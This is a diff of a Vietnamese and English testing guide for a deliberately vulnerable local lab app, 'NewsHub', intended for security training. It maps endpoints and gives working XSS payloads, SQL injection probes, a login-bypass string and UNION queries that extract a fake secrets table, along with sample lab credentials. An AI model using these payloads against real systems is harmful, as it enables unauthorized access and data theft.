@@ -1,21 +1,20 @@
-# NewsHub XSS & SQLi Testing Guide
+# Hướng Dẫn Kiểm Thử XSS Và SQLi Cho NewsHub Lab
 
-Tai lieu nay liet ke cac endpoint va route can kiem thu XSS/SQLi trong NewsHub Vulnerable Lab.
+Tài liệu này liệt kê các URL, endpoint, tham số và vị trí sink dùng để kiểm thử XSS/SQLi trong NewsHub Vulnerable Lab.
 
-Chi dung trong moi truong lab local:
+Base URL mặc định:
 
 ```text
 http://127.0.0.1:8080
 ```
 
-Khong public lab nay ra Internet hoac mang khong tin cay.
+Chỉ dùng trong môi trường lab local. Không dùng các payload này trên hệ thống không được phép kiểm thử.
 
-## Quick Access
+## Mục Lục Nhanh
 
 Classic PHP app:
 
 ```text
-/
 /index.php
 /search.php
 /news.php?id=1
@@ -37,6 +36,13 @@ SPA app:
 /spa/logs
 ```
 
+Classic API:
+
+```text
+/api/suggest.php?q=...
+/api/track.php?page=...&id=...&ref=...
+```
+
 SPA JSON API:
 
 ```text
@@ -47,14 +53,7 @@ SPA JSON API:
 /api/spa/logs.php?keyword=...
 ```
 
-Classic API:
-
-```text
-/api/suggest.php?q=...
-/api/track.php?page=...&id=...&ref=...
-```
-
-Tai khoan mau:
+Tài khoản mẫu:
 
 ```text
 admin / admin123
@@ -64,9 +63,9 @@ minhlt / password
 huongnt / 12345678
 ```
 
-## XSS Overview
+## Payload XSS Mẫu
 
-Payload an toan de test alert:
+Payload cơ bản:
 
 ```html
 <img src=x onerror=alert(1)>
@@ -78,13 +77,13 @@ Payload script tag:
 <script>alert(1)</script>
 ```
 
-Payload HTML break-out cho context nam trong attribute:
+Payload thoát khỏi attribute HTML:
 
 ```html
 "><img src=x onerror=alert(1)>
 ```
 
-Nen URL-encode payload khi gan vao query string:
+Payload URL-encoded:
 
 ```text
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
@@ -92,7 +91,7 @@ Nen URL-encode payload khi gan vao query string:
 
 ## Reflected XSS
 
-### 1. Search page keyword
+### 1. `/search.php?q=...`
 
 Endpoint:
 
@@ -100,7 +99,7 @@ Endpoint:
 GET /search.php?q=PAYLOAD
 ```
 
-Source:
+Tham số:
 
 ```text
 q
@@ -109,26 +108,25 @@ q
 Sink:
 
 ```text
-HTML response trong search page
-input value raw
-message "Ket qua tim kiem cho" raw
-no-result message raw
+HTML response của search page
+input value
+dòng thông báo kết quả tìm kiếm
 ```
 
-Test:
+Payload:
 
 ```text
 /search.php?q=<img src=x onerror=alert(1)>
 /search.php?q="><img src=x onerror=alert(1)>
 ```
 
-Ghi chu:
+Ghi chú:
 
 ```text
-q cung duoc luu vao search_logs, nen cung co the tro thanh stored XSS o admin dashboard va SPA logs.
+q cũng được lưu vào bảng search_logs, vì vậy payload này còn có thể thành Stored XSS ở admin dashboard và SPA logs.
 ```
 
-### 2. Search page author
+### 2. `/search.php?author=...`
 
 Endpoint:
 
@@ -136,7 +134,7 @@ Endpoint:
 GET /search.php?author=PAYLOAD
 ```
 
-Source:
+Tham số:
 
 ```text
 author
@@ -145,22 +143,16 @@ author
 Sink:
 
 ```text
-message "Ket qua tim kiem cho" raw
+dòng thông báo kết quả tìm kiếm
 ```
 
-Test:
+Payload:
 
 ```text
 /search.php?author=<img src=x onerror=alert(1)>
 ```
 
-Ghi chu:
-
-```text
-author cung nam trong SQL raw, nen co the tao SQL error neu payload co dau quote.
-```
-
-### 3. SPA search query
+### 3. SPA search
 
 Route:
 
@@ -168,41 +160,29 @@ Route:
 GET /spa/search?q=PAYLOAD
 ```
 
-API:
+API được gọi:
 
 ```text
 GET /api/spa/search.php?q=PAYLOAD
 ```
 
-Source:
-
-```text
-q
-```
-
 Sink:
 
 ```text
-SPA render data.query bang innerHTML
+app.js render data.query bằng innerHTML
 ```
 
-Test:
+Payload:
 
 ```text
 /spa/search?q=<img src=x onerror=alert(1)>
 ```
 
-Ghi chu:
-
-```text
-Day la reflected XSS trong SPA vi JSON tu API duoc client render unsafe.
-```
-
 ## Stored XSS
 
-### 1. Comment stored XSS - classic page
+### 1. Stored XSS qua comment classic
 
-Create endpoint:
+Tạo comment:
 
 ```text
 POST /comment/add.php
@@ -222,27 +202,21 @@ Sink:
 GET /news.php?id=1
 ```
 
-Vulnerable field:
+Field bị ảnh hưởng:
 
 ```text
 comments.content
 ```
 
-Ghi chu:
+### 2. Stored XSS qua comment SPA
 
-```text
-news.php render comment content raw.
-```
-
-### 2. Comment stored XSS - SPA
-
-Create route:
+Route tạo comment:
 
 ```text
 GET /spa/comments/1
 ```
 
-Create API:
+API tạo comment:
 
 ```text
 POST /api/spa/comment_add.php
@@ -263,22 +237,22 @@ GET /spa/comments/1
 GET /api/spa/comments.php?news_id=1
 ```
 
-Vulnerable fields:
+Field bị ảnh hưởng:
 
 ```text
 comments.content
 comments.author_name
 ```
 
-Ghi chu:
+Ghi chú:
 
 ```text
-SPA lay JSON comment va render comment.content bang innerHTML.
+SPA lấy JSON từ API rồi render comment bằng innerHTML.
 ```
 
-### 3. User bio stored XSS
+### 3. Stored XSS qua user bio
 
-Create endpoint:
+Tạo user:
 
 ```text
 POST /user/register.php
@@ -293,7 +267,7 @@ password=password123
 bio=<img src=x onerror=alert(1)>
 ```
 
-Update endpoint:
+Cập nhật profile:
 
 ```text
 POST /user/profile.php
@@ -314,31 +288,19 @@ GET /user/profile.php?user=xsstest
 GET /admin/users.php
 ```
 
-Vulnerable field:
+Field bị ảnh hưởng:
 
 ```text
 users.bio
 ```
 
-Ghi chu:
+### 4. Stored XSS qua search logs
+
+Seed payload:
 
 ```text
-profile.php va admin/users.php render bio raw.
-```
-
-### 4. Search keyword stored XSS
-
-Seed endpoint:
-
-```text
-GET /search.php?q=PAYLOAD
-GET /api/spa/search.php?q=PAYLOAD
-```
-
-Payload:
-
-```text
-<img src=x onerror=alert(1)>
+GET /search.php?q=<img src=x onerror=alert(1)>
+GET /api/spa/search.php?q=<img src=x onerror=alert(1)>
 ```
 
 Sink:
@@ -349,25 +311,17 @@ GET /spa/logs
 GET /api/spa/logs.php
 ```
 
-Vulnerable field:
+Field bị ảnh hưởng:
 
 ```text
 search_logs.keyword
 ```
 
-Ghi chu:
+### 5. Stored XSS qua User-Agent trong SPA logs
+
+Seed request:
 
 ```text
-admin/dashboard.php render keyword raw.
-SPA logs render keyword raw bang innerHTML.
-```
-
-### 5. User-Agent stored XSS in SPA logs
-
-Seed endpoint:
-
-```text
-GET /search.php?q=test
 GET /api/spa/search.php?q=test
 ```
 
@@ -381,63 +335,49 @@ Sink:
 
 ```text
 GET /spa/logs
-GET /api/spa/logs.php
 ```
 
-Vulnerable field:
+Field bị ảnh hưởng:
 
 ```text
 search_logs.user_agent
 ```
 
-Ghi chu:
+Ghi chú:
 
 ```text
-Can dung Burp/ZAP/curl de sua User-Agent. Classic admin dashboard khong hien user_agent, SPA logs co hien.
+Cần dùng Burp, ZAP, curl hoặc DevTools để sửa header User-Agent.
 ```
 
-### 6. Admin news fields stored XSS in SPA
+### 6. Stored XSS qua bài viết trong admin
 
-Create/update endpoint:
+Endpoint:
 
 ```text
 POST /admin/news_manage.php
 ```
 
-Body fields:
+Các field đáng kiểm thử:
 
 ```text
-title=...
-summary=...
-content=...
-category_id=1
-tags=...
-status=published
+title
+summary
+content
+tags
 ```
 
-Possible sinks:
+Sink:
 
 ```text
+GET /news.php?id={id}
 GET /spa/article/{id}
 GET /spa/search?q=...
-GET /api/spa/news.php?id={id}
-GET /api/spa/search.php?q=...
 ```
 
-Vulnerable fields:
+Ghi chú:
 
 ```text
-news.title
-news.summary
-news.content
-news.tags
-```
-
-Ghi chu:
-
-```text
-SPA render nhieu field va JSON debug output bang innerHTML. Classic news.php render content nhu HTML.
-Can dang nhap de vao admin/news_manage.php.
+Cần đăng nhập. SPA render nhiều field bài viết bằng innerHTML, nên dữ liệu từ API có thể trở thành DOM/Stored XSS.
 ```
 
 ## DOM-Based XSS
@@ -459,19 +399,20 @@ GET /api/suggest.php?q=...
 Sink:
 
 ```text
-search.php JavaScript tao HTML string va gan vao suggestions-container.innerHTML
+search.php tạo HTML string rồi gán vào suggestions-container.innerHTML
 ```
 
 Flow:
 
 ```text
-1. /search.php?q=PAYLOAD luu keyword raw vao search_logs.
-2. JS goi /api/suggest.php?q=PAYLOAD.
-3. API tra suggestion raw tu search_logs/tags.
-4. JS render suggestion bang innerHTML.
+1. Truy cập /search.php?q=PAYLOAD.
+2. q được lưu raw vào search_logs.
+3. JavaScript gọi /api/suggest.php?q=PAYLOAD.
+4. API trả JSON suggestion.
+5. JavaScript render suggestion bằng innerHTML.
 ```
 
-Test:
+Payload:
 
 ```text
 /search.php?q=<img src=x onerror=alert(1)>
@@ -494,10 +435,10 @@ GET /api/spa/search.php?q=PAYLOAD
 Sink:
 
 ```text
-app.js render data.query va result fields bang innerHTML
+app.js render data.query và result fields bằng innerHTML
 ```
 
-Test:
+Payload:
 
 ```text
 /spa/search?q=<img src=x onerror=alert(1)>
@@ -520,14 +461,14 @@ GET /api/spa/comments.php?news_id=1
 Sink:
 
 ```text
-app.js render comments.content va comments.author_name bang innerHTML
+app.js render comments.content và comments.author_name bằng innerHTML
 ```
 
-Test:
+Payload:
 
 ```text
-Tao comment co content = <img src=x onerror=alert(1)>
-Mo lai /spa/comments/1
+Tạo comment có content = <img src=x onerror=alert(1)>
+Mở lại /spa/comments/1
 ```
 
 ### 4. SPA logs render
@@ -536,7 +477,6 @@ Route:
 
 ```text
 GET /spa/logs
-GET /spa/logs?keyword=...
 ```
 
 API:
@@ -548,10 +488,10 @@ GET /api/spa/logs.php?keyword=...
 Sink:
 
 ```text
-app.js render keyword va user_agent bang innerHTML
+app.js render keyword và user_agent bằng innerHTML
 ```
 
-Test:
+Payload:
 
 ```text
 /api/spa/search.php?q=<img src=x onerror=alert(1)>
@@ -575,23 +515,16 @@ GET /api/spa/news.php?id=1
 Sink:
 
 ```text
-app.js render article.title, article.content, article.cat_name, article.username bang innerHTML
+app.js render article.title, article.content, article.cat_name, article.username bằng innerHTML
 ```
 
-Possible source:
+## Payload SQLi Mẫu
 
-```text
-news table fields
-SQLi UNION response from /api/spa/news.php?id=...
-```
-
-## SQLi Overview
-
-Common probes:
+Probe cơ bản:
 
 ```text
 '
-" 
+"
 ' OR 1=1--%20
 ' AND 1=2--%20
 1 OR 1=1
@@ -599,33 +532,33 @@ Common probes:
 1 AND SLEEP(5)
 ```
 
-Error-based probe:
+Error-based:
 
 ```text
 ' AND extractvalue(1,concat(0x7e,database()))--%20
 ```
 
-Boolean blind pair:
+Boolean-based:
 
 ```text
 AND 1=1
 AND 1=2
 ```
 
-Time-based probe:
+Time-based:
 
 ```text
 AND SLEEP(5)
 AND IF(1=1,SLEEP(5),0)
 ```
 
-Secret table target:
+Bảng fake secret:
 
 ```text
 secret_configs(config_key, config_value, description)
 ```
 
-## SQLi - Classic Server-Rendered Pages
+## SQLi - Classic PHP
 
 ### 1. Search SQLi error-based
 
@@ -636,20 +569,14 @@ GET /search.php?q=...
 GET /search.php?author=...
 ```
 
-Vulnerable params:
+Tham số:
 
 ```text
 q
 author
 ```
 
-Behavior:
-
-```text
-SQL error is printed in HTML response.
-```
-
-Tests:
+Payload:
 
 ```text
 /search.php?q='
@@ -658,7 +585,13 @@ Tests:
 /search.php?author=admin' OR '1'='1'--%20
 ```
 
-### 2. Login SQLi auth bypass
+Tín hiệu:
+
+```text
+Lỗi SQL được in ra HTML response.
+```
+
+### 2. Login SQLi authentication bypass
 
 Endpoint:
 
@@ -666,32 +599,34 @@ Endpoint:
 POST /user/login.php
 ```
 
-Vulnerable fields:
+Field:
 
 ```text
 username
 password
 ```
 
-Tests:
+Payload:
 
 ```text
 username=admin'--%20
 password=anything
 ```
 
+Hoặc:
+
 ```text
 username=' OR '1'='1'--%20
 password=anything
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Bypass password check and create session.
+Đăng nhập thành công mà không cần đúng mật khẩu.
 ```
 
-### 3. News article SQLi UNION/error-based
+### 3. News SQLi UNION/error-based
 
 Endpoint:
 
@@ -699,13 +634,13 @@ Endpoint:
 GET /news.php?id=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 id
 ```
 
-Tests:
+Payload:
 
 ```text
 /news.php?id='
@@ -719,11 +654,11 @@ UNION idea:
 /news.php?id=-1 UNION SELECT 1,config_key,config_value,'summary',1,1,0,'published','tag',NOW(),NOW(),'user','email','cat' FROM secret_configs--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Error is printed with SQL query.
-UNION output can appear in article title/content/metadata fields.
+Lỗi SQL được hiển thị.
+UNION output có thể xuất hiện trong vùng article.
 ```
 
 ### 4. Category SQLi boolean-based blind
@@ -734,13 +669,13 @@ Endpoint:
 GET /category.php?id=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 id
 ```
 
-Tests:
+Payload:
 
 ```text
 /category.php?id=1 AND 1=1
@@ -749,12 +684,11 @@ Tests:
 /category.php?id=1 AND SLEEP(5)
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-True condition returns normal category/articles.
-False condition returns empty/not found.
-Errors are not the main signal.
+Điều kiện đúng có dữ liệu.
+Điều kiện sai trả rỗng hoặc báo không tồn tại.
 ```
 
 ### 5. Profile SQLi time-based
@@ -765,115 +699,26 @@ Endpoint:
 GET /user/profile.php?user=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 user
 ```
 
-Tests:
+Payload:
 
 ```text
 /user/profile.php?user=admin' AND SLEEP(5)--%20
 /user/profile.php?user=admin' AND IF(1=1,SLEEP(5),0)--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-SQL errors are intentionally quiet. Use timing or page behavior.
+Lỗi SQL bị ẩn. Dùng độ trễ response để xác nhận.
 ```
 
-### 6. Profile update SQLi/stored XSS
-
-Endpoint:
-
-```text
-POST /user/profile.php
-```
-
-Vulnerable fields:
-
-```text
-bio
-email
-```
-
-Body:
-
-```text
-action=update
-email=test@example.local
-bio=PAYLOAD
-```
-
-Behavior:
-
-```text
-bio is inserted raw into UPDATE statement and rendered raw later.
-Requires logged-in user and own profile.
-```
-
-### 7. Register second-order SQLi / stored XSS
-
-Endpoint:
-
-```text
-POST /user/register.php
-```
-
-Vulnerable field:
-
-```text
-bio
-```
-
-Body:
-
-```text
-username=testuser
-email=test@example.local
-password=password123
-bio=PAYLOAD
-```
-
-Behavior:
-
-```text
-bio is stored raw and later used/rendered in profile/admin views.
-```
-
-### 8. Comment add SQLi / stored XSS
-
-Endpoint:
-
-```text
-POST /comment/add.php
-```
-
-Vulnerable fields:
-
-```text
-news_id
-author_name
-content
-```
-
-Body:
-
-```text
-news_id=1
-author_name=guest
-content=PAYLOAD
-```
-
-Behavior:
-
-```text
-content is inserted raw and rendered raw in comments.
-```
-
-### 9. Tracking API SQLi time-based blind
+### 6. Tracking API SQLi time-based
 
 Endpoint:
 
@@ -881,27 +726,27 @@ Endpoint:
 GET /api/track.php?page=...&id=...&ref=...
 ```
 
-Vulnerable params:
+Tham số:
 
 ```text
 id
 ref
 ```
 
-Tests:
+Payload:
 
 ```text
 /api/track.php?page=news&id=1' AND SLEEP(5)--%20
 /api/track.php?page=news&id=1&ref=http://x.local' AND IF(1=1,SLEEP(5),0)--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Returns 1x1 GIF and suppresses DB errors. Use response time.
+Endpoint trả ảnh GIF 1x1 và suppress lỗi. Dùng timing.
 ```
 
-### 10. Suggest API SQLi
+### 7. Suggest API SQLi
 
 Endpoint:
 
@@ -909,30 +754,28 @@ Endpoint:
 GET /api/suggest.php?q=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 q
 ```
 
-Tests:
+Payload:
 
 ```text
 /api/suggest.php?q=' OR 1=1--%20
 /api/suggest.php?q=' AND SLEEP(5)--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Errors are mostly hidden because endpoint returns JSON suggestions.
-Useful with blind/time-based probes.
-Also serves as JSON source for DOM XSS in /search.php.
+Endpoint trả JSON. Có thể kiểm thử blind/time-based.
 ```
 
-## SQLi - Admin Pages
+## SQLi - Admin
 
-Admin pages require a logged-in session, but some pages only check login, not strong admin authorization.
+Các endpoint admin cần session đăng nhập.
 
 ### 1. Admin dashboard UNION SQLi
 
@@ -942,20 +785,13 @@ Endpoint:
 GET /admin/dashboard.php?filter_cat=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 filter_cat
 ```
 
-Other params:
-
-```text
-filter_status is escaped
-filter_date is currently unused
-```
-
-Tests:
+Payload:
 
 ```text
 /admin/dashboard.php?filter_cat=1'
@@ -968,11 +804,10 @@ UNION idea:
 /admin/dashboard.php?filter_cat=-1 UNION SELECT 1,config_key,'published',0,NOW(),'user',config_value FROM secret_configs--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-SQL error is shown in dashboard.
-UNION output appears in news management table.
+Lỗi SQL hoặc dữ liệu UNION xuất hiện trong bảng quản lý bài viết.
 ```
 
 ### 2. Admin users boolean-based SQLi
@@ -983,19 +818,13 @@ Endpoint:
 GET /admin/users.php?search_user=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 search_user
 ```
 
-Other params:
-
-```text
-role is escaped
-```
-
-Tests:
+Payload:
 
 ```text
 /admin/users.php?search_user=admin' AND 1=1--%20
@@ -1003,10 +832,10 @@ Tests:
 /admin/users.php?search_user=admin' AND (SELECT COUNT(*) FROM secret_configs)>0--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Errors are suppressed. Use result count/table difference.
+Lỗi bị suppress. So sánh số dòng kết quả.
 ```
 
 ### 3. Admin news edit SQLi
@@ -1017,26 +846,20 @@ Endpoint:
 GET /admin/news_manage.php?edit_id=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 edit_id
 ```
 
-Tests:
+Payload:
 
 ```text
 /admin/news_manage.php?edit_id=1'
 /admin/news_manage.php?edit_id=1 OR 1=1
 ```
 
-Behavior:
-
-```text
-edit_id is used raw in SELECT * FROM news WHERE id = ...
-```
-
-### 4. Admin news POST SQLi / stored XSS
+### 4. Admin news POST SQLi / Stored XSS
 
 Endpoint:
 
@@ -1044,34 +867,30 @@ Endpoint:
 POST /admin/news_manage.php
 ```
 
-Vulnerable fields:
+Field đáng kiểm thử:
 
 ```text
 tags
-post_id related update path
+title
+summary
+content
 ```
 
-Body fields:
+Body mẫu:
 
 ```text
 post_id=0
-title=...
-summary=...
-content=...
+title=Test
+summary=Test
+content=<p>Test</p>
 category_id=1
-tags=PAYLOAD
+tags=<img src=x onerror=alert(1)>
 status=published
-```
-
-Behavior:
-
-```text
-tags is stored raw in INSERT/UPDATE.
 ```
 
 ## SQLi - SPA JSON API
 
-These endpoints return JSON and are called by the SPA. Test them directly with browser, curl, Burp, ZAP, Postman, or DevTools Network.
+Các endpoint này trả JSON và được SPA gọi bằng `fetch()`. Nên kiểm thử trực tiếp bằng Burp, ZAP, Postman, curl hoặc tab Network.
 
 ### 1. SPA search API
 
@@ -1081,19 +900,13 @@ Endpoint:
 GET /api/spa/search.php?q=...&sort=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 q
 ```
 
-Other params:
-
-```text
-sort allows newest/views only
-```
-
-Tests:
+Payload:
 
 ```text
 /api/spa/search.php?q='
@@ -1101,11 +914,11 @@ Tests:
 /api/spa/search.php?q=' AND extractvalue(1,concat(0x7e,database()))--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Errors are returned as JSON: ok=false, db_error, sql.
-q is also inserted into search_logs raw.
+JSON trả về ok=false, db_error và sql.
+q cũng được lưu vào search_logs.
 ```
 
 SPA sink:
@@ -1122,13 +935,13 @@ Endpoint:
 GET /api/spa/news.php?id=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 id
 ```
 
-Tests:
+Payload:
 
 ```text
 /api/spa/news.php?id='
@@ -1142,17 +955,11 @@ UNION idea:
 /api/spa/news.php?id=-1 UNION SELECT 1,config_key,config_value,'summary','tag',0,NOW(),'user','email','cat',1 FROM secret_configs--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Errors are returned as JSON.
-SPA renders article fields with innerHTML.
-```
-
-SPA sink:
-
-```text
-/spa/article/1
+Lỗi SQL trả về JSON.
+SPA render article fields bằng innerHTML.
 ```
 
 ### 3. SPA comments API
@@ -1163,30 +970,24 @@ Endpoint:
 GET /api/spa/comments.php?news_id=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 news_id
 ```
 
-Tests:
+Payload:
 
 ```text
 /api/spa/comments.php?news_id=1 OR 1=1
 /api/spa/comments.php?news_id=1 AND SLEEP(5)
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Errors are returned as JSON.
-SPA renders comments with innerHTML.
-```
-
-SPA sink:
-
-```text
-/spa/comments/1
+JSON response thay đổi hoặc bị delay.
+SPA render comments bằng innerHTML.
 ```
 
 ### 4. SPA comment create API
@@ -1197,7 +998,7 @@ Endpoint:
 POST /api/spa/comment_add.php
 ```
 
-Vulnerable fields:
+Field:
 
 ```text
 news_id
@@ -1213,12 +1014,11 @@ author_name=spa_guest
 content=<img src=x onerror=alert(1)>
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Creates stored XSS.
-Raw fields are interpolated into INSERT SQL.
-Errors are returned as JSON.
+Tạo Stored XSS.
+Nếu SQL lỗi, API trả JSON có db_error và sql.
 ```
 
 Sink:
@@ -1236,13 +1036,13 @@ Endpoint:
 GET /api/spa/logs.php?keyword=...
 ```
 
-Vulnerable param:
+Tham số:
 
 ```text
 keyword
 ```
 
-Tests:
+Payload:
 
 ```text
 /api/spa/logs.php?keyword='
@@ -1250,23 +1050,16 @@ Tests:
 /api/spa/logs.php?keyword=' AND SLEEP(5)--%20
 ```
 
-Behavior:
+Tín hiệu:
 
 ```text
-Errors are returned as JSON.
-SPA renders keyword and user_agent with innerHTML.
+JSON trả db_error nếu lỗi.
+SPA render keyword và user_agent bằng innerHTML.
 ```
 
-SPA sink:
+## Trang Tĩnh
 
-```text
-/spa/logs
-/spa/logs?keyword=...
-```
-
-## Static Pages
-
-Static HTML pages:
+Các trang tĩnh:
 
 ```text
 /static/about.html
@@ -1274,32 +1067,61 @@ Static HTML pages:
 /static/faq.html
 ```
 
-Current status:
+Hiện trạng:
 
 ```text
-No database query.
-No backend form processing.
-Useful for crawler/static content tests, not primary XSS/SQLi targets.
+Không truy vấn database.
+Không có backend xử lý form thật.
+Phù hợp để test crawler/static content, không phải mục tiêu chính cho XSS/SQLi.
 ```
 
-## Recommended Testing Flow
+## Ma Trận Endpoint
 
-1. Start app:
+| Loại | Method | Endpoint/Route | Param/Field | Sink/Tín hiệu |
+|---|---:|---|---|---|
+| Reflected XSS | GET | `/search.php` | `q`, `author` | HTML response |
+| DOM XSS | GET | `/search.php` | `q` qua `/api/suggest.php` | `innerHTML` suggestions |
+| Stored XSS | POST | `/comment/add.php` | `content` | `/news.php?id=...` |
+| Stored XSS | POST | `/user/register.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
+| Stored XSS | POST | `/user/profile.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
+| Stored XSS | GET | `/search.php` | `q` | `/admin/dashboard.php`, `/spa/logs` |
+| DOM/Stored XSS | GET | `/spa/search` | `q` | SPA `innerHTML` |
+| DOM/Stored XSS | GET | `/spa/comments/{id}` | comment JSON | SPA `innerHTML` |
+| DOM/Stored XSS | GET | `/spa/logs` | log JSON | SPA `innerHTML` |
+| SQLi Error | GET | `/search.php` | `q`, `author` | DB error trong HTML |
+| SQLi Auth Bypass | POST | `/user/login.php` | `username`, `password` | Login session |
+| SQLi UNION/Error | GET | `/news.php` | `id` | Article output/error |
+| SQLi Boolean | GET | `/category.php` | `id` | Có/không có kết quả |
+| SQLi Time | GET | `/user/profile.php` | `user` | Response delay |
+| SQLi Time | GET | `/api/track.php` | `id`, `ref` | Response delay |
+| SQLi Blind | GET | `/api/suggest.php` | `q` | JSON/timing |
+| SQLi UNION/Error | GET | `/admin/dashboard.php` | `filter_cat` | Table/error |
+| SQLi Boolean | GET | `/admin/users.php` | `search_user` | Số dòng kết quả |
+| SQLi | GET | `/admin/news_manage.php` | `edit_id` | Form/error |
+| SQLi JSON | GET | `/api/spa/search.php` | `q` | JSON `db_error` |
+| SQLi JSON | GET | `/api/spa/news.php` | `id` | JSON `db_error` |
+| SQLi JSON | GET | `/api/spa/comments.php` | `news_id` | JSON `db_error` |
+| SQLi JSON | POST | `/api/spa/comment_add.php` | `news_id`, `author_name`, `content` | JSON `db_error` |
+| SQLi JSON | GET | `/api/spa/logs.php` | `keyword` | JSON `db_error` |
+
+## Luồng Kiểm Thử Gợi Ý
+
+1. Chạy lab:
 
 ```bash
 docker compose up -d --build
-# or
+# hoặc
 docker-compose up -d --build
 ```
 
-2. Browse classic app:
+2. Mở classic app:
 
 ```text
 http://127.0.0.1:8080/search.php?q=test
 http://127.0.0.1:8080/news.php?id=1
 ```
 
-3. Browse SPA app:
+3. Mở SPA:
 
 ```text
 http://127.0.0.1:8080/spa/search
@@ -1307,7 +1129,7 @@ http://127.0.0.1:8080/spa/comments/1
 http://127.0.0.1:8080/spa/logs
 ```
 
-4. Use DevTools Network/Burp/ZAP to capture these API calls:
+4. Bật Burp/ZAP hoặc DevTools Network để bắt API:
 
 ```text
 /api/spa/search.php
@@ -1319,36 +1141,15 @@ http://127.0.0.1:8080/spa/logs
 /api/track.php
 ```
 
-5. Test XSS first with harmless `alert(1)` payloads.
+5. Test XSS trước bằng `alert(1)`.
 
-6. Test SQLi with simple quote/error probes, then boolean/time-based probes, then UNION only inside lab.
+6. Test SQLi theo thứ tự:
 
-## Endpoint Matrix
-
-| Type | Method | Endpoint/Route | Param/Field | Sink/Signal |
-|---|---:|---|---|---|
-| Reflected XSS | GET | `/search.php` | `q`, `author` | HTML response |
-| DOM XSS | GET | `/search.php` | `q` via `/api/suggest.php` | `innerHTML` suggestions |
-| Stored XSS | POST | `/comment/add.php` | `content` | `/news.php?id=...` |
-| Stored XSS | POST | `/user/register.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
-| Stored XSS | POST | `/user/profile.php` | `bio` | `/user/profile.php`, `/admin/users.php` |
-| Stored XSS | GET | `/search.php` | `q` | `/admin/dashboard.php`, `/spa/logs` |
-| DOM/Stored XSS | GET | `/spa/search` | `q` | SPA `innerHTML` |
-| DOM/Stored XSS | GET | `/spa/comments/{id}` | comment JSON | SPA `innerHTML` |
-| DOM/Stored XSS | GET | `/spa/logs` | log JSON | SPA `innerHTML` |
-| SQLi Error | GET | `/search.php` | `q`, `author` | DB error in HTML |
-| SQLi Auth Bypass | POST | `/user/login.php` | `username`, `password` | Login session |
-| SQLi UNION/Error | GET | `/news.php` | `id` | Article output/error |
-| SQLi Boolean | GET | `/category.php` | `id` | Result/no-result |
-| SQLi Time | GET | `/user/profile.php` | `user` | Response delay |
-| SQLi Time | GET | `/api/track.php` | `id`, `ref` | Response delay |
-| SQLi Blind | GET | `/api/suggest.php` | `q` | JSON/timing |
-| SQLi UNION/Error | GET | `/admin/dashboard.php` | `filter_cat` | Table/error |
-| SQLi Boolean | GET | `/admin/users.php` | `search_user` | Result count |
-| SQLi | GET | `/admin/news_manage.php` | `edit_id` | Form/error |
-| SQLi JSON | GET | `/api/spa/search.php` | `q` | JSON `db_error` |
-| SQLi JSON | GET | `/api/spa/news.php` | `id` | JSON `db_error` |
-| SQLi JSON | GET | `/api/spa/comments.php` | `news_id` | JSON `db_error` |
-| SQLi JSON | POST | `/api/spa/comment_add.php` | `news_id`, `author_name`, `content` | JSON `db_error` |
-| SQLi JSON | GET | `/api/spa/logs.php` | `keyword` | JSON `db_error` |
+```text
+quote probe
+error-based
+boolean-based
+time-based
+UNION-based
+```
 
